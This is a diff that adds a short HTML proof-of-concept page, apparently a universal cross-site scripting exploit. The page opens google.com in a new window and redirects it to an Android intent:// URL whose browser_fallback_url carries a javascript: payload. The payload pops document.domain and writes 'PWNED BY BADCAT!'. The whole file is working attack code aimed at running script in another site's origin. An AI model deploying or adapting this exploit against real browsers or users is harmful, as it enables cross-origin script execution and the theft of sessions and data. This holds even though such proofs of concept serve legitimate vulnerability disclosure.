@@ -1,0 +1,15 @@
+<!doctype html>
+<meta charset=utf-8>
+<body>
+<button id=btn>Run</button>
+<script>
+const js = 'alert(document.domain);document.write("<h1>UNIVERSAL XSS</h1><br><h1>PWNED BY BADCAT!</h1>")';
+const payload = 'intent://x#Intent;scheme=z;S.browser_fallback_url=javascript:'
+              + encodeURIComponent(js) + ';end';
+
+btn.onclick = () => {
+  const w = window.open('https://www.google.com/');
+  if (!w) return;
+  setTimeout(() => { w.location = payload; }, 100);
+};
+</script>
